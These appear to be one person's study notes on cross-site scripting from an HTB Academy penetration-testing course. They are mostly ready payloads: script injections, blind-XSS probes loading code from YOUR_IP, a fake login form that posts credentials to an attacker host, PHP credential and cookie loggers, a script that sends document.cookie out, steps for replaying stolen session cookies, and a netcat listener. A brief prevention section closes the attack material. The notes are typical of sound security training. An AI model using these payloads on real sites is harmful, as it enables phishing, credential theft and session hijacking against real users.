# XSS — Study Notes
> HTB Academy | CPTS Prep | Ali El Boury

---

## Types

| Type | Server? | Persists? | Delivery |
|------|---------|-----------|----------|
| Stored | ✅ | ✅ | Visit page |
| Reflected | ✅ | ❌ | Crafted URL |
| DOM-based | ❌ | ❌ | URL with `#` |

---

## Test Payloads

```html
<!-- Standard -->
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>

<!-- When script tags blocked (innerHTML sink) -->
<img src="" onerror=alert(document.cookie)>

<!-- When alert() blocked -->
<script>print()</script>

<!-- Blind XSS — identify vulnerable field -->
<script src=http://YOUR_IP/fieldname></script>
'><script src=http://YOUR_IP/fieldname></script>
"><script src=http://YOUR_IP/fieldname></script>
```

---

## Source & Sink (DOM XSS)

- **Source** → where input comes from (`document.URL`, `location.hash`)
- **Sink** → where it gets written (`innerHTML`, `document.write()`, `append()`)

---

## Defacing

```javascript
document.body.style.background = "#141d2b"
document.title = 'Hacked'
document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked</h1>'
```

---

## Phishing

**Full payload:**
```
'><script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP:PORT/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

**Credential catcher (index.php):**
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET/original/page");
    fclose($file);
    exit();
}
?>
```

---

## Session Hijacking

**script.js:**
```javascript
new Image().src='http://YOUR_IP/index.php?c='+document.cookie
```

**Cookie logger (index.php):**
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**Inject in vulnerable field:**
```html
<script src=http://YOUR_IP/script.js></script>
```

**Use stolen cookie:**
Firefox → `Shift+F9` → Storage → `+` → add Name + Value → refresh

---

## Prevention

**Front-end:** DOMPurify, input validation, avoid `innerHTML` / `document.write()`

**Back-end:** `htmlspecialchars()`, `addslashes()`, `filter_var()`, never render raw `$_GET`

**Server:** `HttpOnly` + `Secure` cookies, CSP `script-src 'self'`, WAF

---

## Useful Commands

```bash
# PHP server
sudo php -S 0.0.0.0:80

# Netcat listener
sudo nc -lvnp 80

# Send payload via curl (avoids shell special char issues)
set +H
curl -G "http://TARGET/send.php" --data-urlencode "url=PAYLOAD"

# XSStrike
python xsstrike.py -u "http://TARGET/index.php?param=test"
```

---

## Identify XSS Type

```
Persists after refresh?
  ├── YES → Stored
  └── NO → Network request in DevTools?
              ├── YES → Reflected
              └── NO  → DOM-based
```